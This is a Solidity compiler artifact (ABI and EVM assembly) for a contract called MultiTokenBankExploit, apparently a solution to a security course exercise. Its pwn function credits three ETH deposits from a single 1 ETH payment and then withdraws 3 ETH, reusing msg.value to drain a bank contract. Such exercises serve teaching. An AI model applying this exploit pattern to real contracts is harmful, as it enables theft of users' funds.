{
	"Modules/Security/7. Multi Token Bank.sol": {
		"MultiTokenBankExploit": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_bank",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "ETH",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "bank",
					"outputs": [
						{
							"internalType": "contract IMultiTokenBank",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "pwn",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"Modules/Security/7. Multi Token Bank.sol\":367:1028  contract MultiTokenBankExploit {... */\n  mstore(0x40, 0x80)\n    /* \"Modules/Security/7. Multi Token Bank.sol\":516:589  constructor(address _bank) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"Modules/Security/7. Multi Token Bank.sol\":576:581  _bank */\n  dup1\n    /* \"Modules/Security/7. Multi Token Bank.sol\":553:557  bank */\n  0x00\n  dup1\n    /* \"Modules/Security/7. Multi Token Bank.sol\":553:582  bank = IMultiTokenBank(_bank) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"Modules/Security/7. Multi Token Bank.sol\":516:589  constructor(address _bank) {... */\n  pop\n    /* \"Modules/Security/7. Multi Token Bank.sol\":367:1028  contract MultiTokenBankExploit {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"Modules/Security/7. Multi Token Bank.sol\":367:1028  contract MultiTokenBankExploit {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"Modules/Security/7. Multi Token Bank.sol\":367:1028  contract MultiTokenBankExploit {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x76cdb03b\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x8322fff2\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xdd365b8b\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"Modules/Security/7. Multi Token Bank.sol\":482:509  IMultiTokenBank public bank */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_8\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_8:\n      pop\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Modules/Security/7. Multi Token Bank.sol\":404:476  address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_13\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_13:\n      pop\n      tag_14\n      tag_15\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Modules/Security/7. Multi Token Bank.sol\":630:1026  function pwn() external payable {... */\n    tag_5:\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      stop\n        /* \"Modules/Security/7. Multi Token Bank.sol\":482:509  IMultiTokenBank public bank */\n    tag_10:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"Modules/Security/7. Multi Token Bank.sol\":404:476  address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE */\n    tag_15:\n        /* \"Modules/Security/7. Multi Token Bank.sol\":434:476  0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE */\n      0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee\n        /* \"Modules/Security/7. Multi Token Bank.sol\":404:476  address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE */\n      dup2\n      jump\t// out\n        /* \"Modules/Security/7. Multi Token Bank.sol\":630:1026  function pwn() external payable {... */\n    tag_19:\n        /* \"Modules/Security/7. Multi Token Bank.sol\":672:695  address[] memory tokens */\n      0x00\n        /* \"Modules/Security/7. Multi Token Bank.sol\":712:713  3 */\n      0x03\n        /* \"Modules/Security/7. Multi Token Bank.sol\":698:714  new address[](3) */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_21\n      jumpi\n      tag_22\n      tag_23\n      jump\t// in\n    tag_22:\n    tag_21:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x20\n      mul\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_24\n      jumpi\n      dup2\n      0x20\n      add\n      0x20\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_24:\n      pop\n        /* \"Modules/Security/7. Multi Token Bank.sol\":672:714  address[] memory tokens = new address[](3) */\n      swap1\n      pop\n        /* \"Modules/Security/7. Multi Token Bank.sol\":434:476  0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE */\n      0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee\n        /* \"Modules/Security/7. Multi Token Bank.sol\":724:730  tokens */\n      dup2\n        /* \"Modules/Security/7. Multi Token Bank.sol\":731:732  0 */\n      0x00\n        /* \"Modules/Security/7. Multi Token Bank.sol\":724:733  tokens[0] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_25\n      jumpi\n      tag_26\n      tag_27\n      jump\t// in\n    tag_26:\n    tag_25:\n      0x20\n      mul\n      0x20\n      add\n      add\n        /* \"Modules/Security/7. Multi Token Bank.sol\":724:739  tokens[0] = ETH */\n      swap1\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      pop\n      pop\n        /* \"Modules/Security/7. Multi Token Bank.sol\":434:476  0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE */\n      0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee\n        /* \"Modules/Security/7. Multi Token Bank.sol\":749:755  tokens */\n      dup2\n        /* \"Modules/Security/7. Multi Token Bank.sol\":756:757  1 */\n      0x01\n        /* \"Modules/Security/7. Multi Token Bank.sol\":749:758  tokens[1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_28\n      jumpi\n      tag_29\n      tag_27\n      jump\t// in\n    tag_29:\n    tag_28:\n      0x20\n      mul\n      0x20\n      add\n      add\n        /* \"Modules/Security/7. Multi Token Bank.sol\":749:764  tokens[1] = ETH */\n      swap1\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      pop\n      pop\n        /* \"Modules/Security/7. Multi Token Bank.sol\":434:476  0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE */\n      0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee\n        /* \"Modules/Security/7. Multi Token Bank.sol\":774:780  tokens */\n      dup2\n        /* \"Modules/Security/7. Multi Token Bank.sol\":781:782  2 */\n      0x02\n        /* \"Modules/Security/7. Multi Token Bank.sol\":774:783  tokens[2] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_30\n      jumpi\n      tag_31\n      tag_27\n      jump\t// in\n    tag_31:\n    tag_30:\n      0x20\n      mul\n      0x20\n      add\n      add\n        /* \"Modules/Security/7. Multi Token Bank.sol\":774:789  tokens[2] = ETH */\n      swap1\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      pop\n      pop\n        /* \"Modules/Security/7. Multi Token Bank.sol\":800:824  uint256[] memory amounts */\n      0x00\n        /* \"Modules/Security/7. Multi Token Bank.sol\":841:842  3 */\n      0x03\n        /* \"Modules/Security/7. Multi Token Bank.sol\":827:843  new uint256[](3) */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_32\n      jumpi\n      tag_33\n      tag_23\n      jump\t// in\n    tag_33:\n    tag_32:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x20\n      mul\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_34\n      jumpi\n      dup2\n      0x20\n      add\n      0x20\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_34:\n      pop\n        /* \"Modules/Security/7. Multi Token Bank.sol\":800:843  uint256[] memory amounts = new uint256[](3) */\n      swap1\n      pop\n        /* \"Modules/Security/7. Multi Token Bank.sol\":866:870  1e18 */\n      0x0de0b6b3a7640000\n        /* \"Modules/Security/7. Multi Token Bank.sol\":853:860  amounts */\n      dup2\n        /* \"Modules/Security/7. Multi Token Bank.sol\":861:862  0 */\n      0x00\n        /* \"Modules/Security/7. Multi Token Bank.sol\":853:863  amounts[0] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_35\n      jumpi\n      tag_36\n      tag_27\n      jump\t// in\n    tag_36:\n    tag_35:\n      0x20\n      mul\n      0x20\n      add\n      add\n        /* \"Modules/Security/7. Multi Token Bank.sol\":853:870  amounts[0] = 1e18 */\n      dup2\n      dup2\n      mstore\n      pop\n      pop\n        /* \"Modules/Security/7. Multi Token Bank.sol\":893:897  1e18 */\n      0x0de0b6b3a7640000\n        /* \"Modules/Security/7. Multi Token Bank.sol\":880:887  amounts */\n      dup2\n        /* \"Modules/Security/7. Multi Token Bank.sol\":888:889  1 */\n      0x01\n        /* \"Modules/Security/7. Multi Token Bank.sol\":880:890  amounts[1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_37\n      jumpi\n      tag_38\n      tag_27\n      jump\t// in\n    tag_38:\n    tag_37:\n      0x20\n      mul\n      0x20\n      add\n      add\n        /* \"Modules/Security/7. Multi Token Bank.sol\":880:897  amounts[1] = 1e18 */\n      dup2\n      dup2\n      mstore\n      pop\n      pop\n        /* \"Modules/Security/7. Multi Token Bank.sol\":920:924  1e18 */\n      0x0de0b6b3a7640000\n        /* \"Modules/Security/7. Multi Token Bank.sol\":907:914  amounts */\n      dup2\n        /* \"Modules/Security/7. Multi Token Bank.sol\":915:916  2 */\n      0x02\n        /* \"Modules/Security/7. Multi Token Bank.sol\":907:917  amounts[2] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_39\n      jumpi\n      tag_40\n      tag_27\n      jump\t// in\n    tag_40:\n    tag_39:\n      0x20\n      mul\n      0x20\n      add\n      add\n        /* \"Modules/Security/7. Multi Token Bank.sol\":907:924  amounts[2] = 1e18 */\n      dup2\n      dup2\n      mstore\n      pop\n      pop\n        /* \"Modules/Security/7. Multi Token Bank.sol\":935:939  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Modules/Security/7. Multi Token Bank.sol\":935:951  bank.depositMany */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x638c079a\n        /* \"Modules/Security/7. Multi Token Bank.sol\":959:963  1e18 */\n      0x0de0b6b3a7640000\n        /* \"Modules/Security/7. Multi Token Bank.sol\":965:971  tokens */\n      dup5\n        /* \"Modules/Security/7. Multi Token Bank.sol\":973:980  amounts */\n      dup5\n        /* \"Modules/Security/7. Multi Token Bank.sol\":935:981  bank.depositMany{value: 1e18}(tokens, amounts) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_41\n      swap3\n      swap2\n      swap1\n      tag_42\n      jump\t// in\n    tag_41:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_43\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_43:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_45\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_45:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Modules/Security/7. Multi Token Bank.sol\":991:995  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Modules/Security/7. Multi Token Bank.sol\":991:1004  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xf3fef3a3\n        /* \"Modules/Security/7. Multi Token Bank.sol\":434:476  0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE */\n      0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee\n        /* \"Modules/Security/7. Multi Token Bank.sol\":1010:1018  3 * 1e18 */\n      0x29a2241af62c0000\n        /* \"Modules/Security/7. Multi Token Bank.sol\":991:1019  bank.withdraw(ETH, 3 * 1e18) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_46\n      swap3\n      swap2\n      swap1\n      tag_47\n      jump\t// in\n    tag_46:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_48\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_48:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_50\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_50:\n      pop\n      pop\n      pop\n      pop\n        /* \"Modules/Security/7. Multi Token Bank.sol\":662:1026  {... */\n      pop\n      pop\n        /* \"Modules/Security/7. Multi Token Bank.sol\":630:1026  function pwn() external payable {... */\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_51:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:199   */\n    tag_52:\n        /* \"#utility.yul\":167:170   */\n      0x00\n        /* \"#utility.yul\":188:193   */\n      dup2\n        /* \"#utility.yul\":181:193   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:199   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":205:347   */\n    tag_53:\n        /* \"#utility.yul\":255:264   */\n      0x00\n        /* \"#utility.yul\":288:341   */\n      tag_81\n        /* \"#utility.yul\":306:340   */\n      tag_82\n        /* \"#utility.yul\":315:339   */\n      tag_83\n        /* \"#utility.yul\":333:338   */\n      dup5\n        /* \"#utility.yul\":315:339   */\n      tag_51\n      jump\t// in\n    tag_83:\n        /* \"#utility.yul\":306:340   */\n      tag_52\n      jump\t// in\n    tag_82:\n        /* \"#utility.yul\":288:341   */\n      tag_51\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":275:341   */\n      swap1\n      pop\n        /* \"#utility.yul\":205:347   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":353:479   */\n    tag_54:\n        /* \"#utility.yul\":403:412   */\n      0x00\n        /* \"#utility.yul\":436:473   */\n      tag_85\n        /* \"#utility.yul\":467:472   */\n      dup3\n        /* \"#utility.yul\":436:473   */\n      tag_53\n      jump\t// in\n    tag_85:\n        /* \"#utility.yul\":423:473   */\n      swap1\n      pop\n        /* \"#utility.yul\":353:479   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":485:633   */\n    tag_55:\n        /* \"#utility.yul\":557:566   */\n      0x00\n        /* \"#utility.yul\":590:627   */\n      tag_87\n        /* \"#utility.yul\":621:626   */\n      dup3\n        /* \"#utility.yul\":590:627   */\n      tag_54\n      jump\t// in\n    tag_87:\n        /* \"#utility.yul\":577:627   */\n      swap1\n      pop\n        /* \"#utility.yul\":485:633   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":639:814   */\n    tag_56:\n        /* \"#utility.yul\":748:807   */\n      tag_89\n        /* \"#utility.yul\":801:806   */\n      dup2\n        /* \"#utility.yul\":748:807   */\n      tag_55\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":743:746   */\n      dup3\n        /* \"#utility.yul\":736:808   */\n      mstore\n        /* \"#utility.yul\":639:814   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":820:1086   */\n    tag_12:\n        /* \"#utility.yul\":935:939   */\n      0x00\n        /* \"#utility.yul\":973:975   */\n      0x20\n        /* \"#utility.yul\":962:971   */\n      dup3\n        /* \"#utility.yul\":958:976   */\n      add\n        /* \"#utility.yul\":950:976   */\n      swap1\n      pop\n        /* \"#utility.yul\":986:1079   */\n      tag_91\n        /* \"#utility.yul\":1076:1077   */\n      0x00\n        /* \"#utility.yul\":1065:1074   */\n      dup4\n        /* \"#utility.yul\":1061:1078   */\n      add\n        /* \"#utility.yul\":1052:1058   */\n      dup5\n        /* \"#utility.yul\":986:1079   */\n      tag_56\n      jump\t// in\n    tag_91:\n        /* \"#utility.yul\":820:1086   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1092:1188   */\n    tag_57:\n        /* \"#utility.yul\":1129:1136   */\n      0x00\n        /* \"#utility.yul\":1158:1182   */\n      tag_93\n        /* \"#utility.yul\":1176:1181   */\n      dup3\n        /* \"#utility.yul\":1158:1182   */\n      tag_51\n      jump\t// in\n    tag_93:\n        /* \"#utility.yul\":1147:1182   */\n      swap1\n      pop\n        /* \"#utility.yul\":1092:1188   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1194:1312   */\n    tag_58:\n        /* \"#utility.yul\":1281:1305   */\n      tag_95\n        /* \"#utility.yul\":1299:1304   */\n      dup2\n        /* \"#utility.yul\":1281:1305   */\n      tag_57\n      jump\t// in\n    tag_95:\n        /* \"#utility.yul\":1276:1279   */\n      dup3\n        /* \"#utility.yul\":1269:1306   */\n      mstore\n        /* \"#utility.yul\":1194:1312   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1318:1540   */\n    tag_17:\n        /* \"#utility.yul\":1411:1415   */\n      0x00\n        /* \"#utility.yul\":1449:1451   */\n      0x20\n        /* \"#utility.yul\":1438:1447   */\n      dup3\n        /* \"#utility.yul\":1434:1452   */\n      add\n        /* \"#utility.yul\":1426:1452   */\n      swap1\n      pop\n        /* \"#utility.yul\":1462:1533   */\n      tag_97\n        /* \"#utility.yul\":1530:1531   */\n      0x00\n        /* \"#utility.yul\":1519:1528   */\n      dup4\n        /* \"#utility.yul\":1515:1532   */\n      add\n        /* \"#utility.yul\":1506:1512   */\n      dup5\n        /* \"#utility.yul\":1462:1533   */\n      tag_58\n      jump\t// in\n    tag_97:\n        /* \"#utility.yul\":1318:1540   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1546:1726   */\n    tag_23:\n        /* \"#utility.yul\":1594:1671   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1591:1592   */\n      0x00\n        /* \"#utility.yul\":1584:1672   */\n      mstore\n        /* \"#utility.yul\":1691:1695   */\n      0x41\n        /* \"#utility.yul\":1688:1689   */\n      0x04\n        /* \"#utility.yul\":1681:1696   */\n      mstore\n        /* \"#utility.yul\":1715:1719   */\n      0x24\n        /* \"#utility.yul\":1712:1713   */\n      0x00\n        /* \"#utility.yul\":1705:1720   */\n      revert\n        /* \"#utility.yul\":1732:1912   */\n    tag_27:\n        /* \"#utility.yul\":1780:1857   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1777:1778   */\n      0x00\n        /* \"#utility.yul\":1770:1858   */\n      mstore\n        /* \"#utility.yul\":1877:1881   */\n      0x32\n        /* \"#utility.yul\":1874:1875   */\n      0x04\n        /* \"#utility.yul\":1867:1882   */\n      mstore\n        /* \"#utility.yul\":1901:1905   */\n      0x24\n        /* \"#utility.yul\":1898:1899   */\n      0x00\n        /* \"#utility.yul\":1891:1906   */\n      revert\n        /* \"#utility.yul\":1918:2032   */\n    tag_59:\n        /* \"#utility.yul\":1985:1991   */\n      0x00\n        /* \"#utility.yul\":2019:2024   */\n      dup2\n        /* \"#utility.yul\":2013:2025   */\n      mload\n        /* \"#utility.yul\":2003:2025   */\n      swap1\n      pop\n        /* \"#utility.yul\":1918:2032   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2038:2222   */\n    tag_60:\n        /* \"#utility.yul\":2137:2148   */\n      0x00\n        /* \"#utility.yul\":2171:2177   */\n      dup3\n        /* \"#utility.yul\":2166:2169   */\n      dup3\n        /* \"#utility.yul\":2159:2178   */\n      mstore\n        /* \"#utility.yul\":2211:2215   */\n      0x20\n        /* \"#utility.yul\":2206:2209   */\n      dup3\n        /* \"#utility.yul\":2202:2216   */\n      add\n        /* \"#utility.yul\":2187:2216   */\n      swap1\n      pop\n        /* \"#utility.yul\":2038:2222   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2228:2360   */\n    tag_61:\n        /* \"#utility.yul\":2295:2299   */\n      0x00\n        /* \"#utility.yul\":2318:2321   */\n      dup2\n        /* \"#utility.yul\":2310:2321   */\n      swap1\n      pop\n        /* \"#utility.yul\":2348:2352   */\n      0x20\n        /* \"#utility.yul\":2343:2346   */\n      dup3\n        /* \"#utility.yul\":2339:2353   */\n      add\n        /* \"#utility.yul\":2331:2353   */\n      swap1\n      pop\n        /* \"#utility.yul\":2228:2360   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2366:2474   */\n    tag_62:\n        /* \"#utility.yul\":2443:2467   */\n      tag_104\n        /* \"#utility.yul\":2461:2466   */\n      dup2\n        /* \"#utility.yul\":2443:2467   */\n      tag_57\n      jump\t// in\n    tag_104:\n        /* \"#utility.yul\":2438:2441   */\n      dup3\n        /* \"#utility.yul\":2431:2468   */\n      mstore\n        /* \"#utility.yul\":2366:2474   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2480:2659   */\n    tag_63:\n        /* \"#utility.yul\":2549:2559   */\n      0x00\n        /* \"#utility.yul\":2570:2616   */\n      tag_106\n        /* \"#utility.yul\":2612:2615   */\n      dup4\n        /* \"#utility.yul\":2604:2610   */\n      dup4\n        /* \"#utility.yul\":2570:2616   */\n      tag_62\n      jump\t// in\n    tag_106:\n        /* \"#utility.yul\":2648:2652   */\n      0x20\n        /* \"#utility.yul\":2643:2646   */\n      dup4\n        /* \"#utility.yul\":2639:2653   */\n      add\n        /* \"#utility.yul\":2625:2653   */\n      swap1\n      pop\n        /* \"#utility.yul\":2480:2659   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2665:2778   */\n    tag_64:\n        /* \"#utility.yul\":2735:2739   */\n      0x00\n        /* \"#utility.yul\":2767:2771   */\n      0x20\n        /* \"#utility.yul\":2762:2765   */\n      dup3\n        /* \"#utility.yul\":2758:2772   */\n      add\n        /* \"#utility.yul\":2750:2772   */\n      swap1\n      pop\n        /* \"#utility.yul\":2665:2778   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2814:3546   */\n    tag_65:\n        /* \"#utility.yul\":2933:2936   */\n      0x00\n        /* \"#utility.yul\":2962:3016   */\n      tag_109\n        /* \"#utility.yul\":3010:3015   */\n      dup3\n        /* \"#utility.yul\":2962:3016   */\n      tag_59\n      jump\t// in\n    tag_109:\n        /* \"#utility.yul\":3032:3118   */\n      tag_110\n        /* \"#utility.yul\":3111:3117   */\n      dup2\n        /* \"#utility.yul\":3106:3109   */\n      dup6\n        /* \"#utility.yul\":3032:3118   */\n      tag_60\n      jump\t// in\n    tag_110:\n        /* \"#utility.yul\":3025:3118   */\n      swap4\n      pop\n        /* \"#utility.yul\":3142:3198   */\n      tag_111\n        /* \"#utility.yul\":3192:3197   */\n      dup4\n        /* \"#utility.yul\":3142:3198   */\n      tag_61\n      jump\t// in\n    tag_111:\n        /* \"#utility.yul\":3221:3228   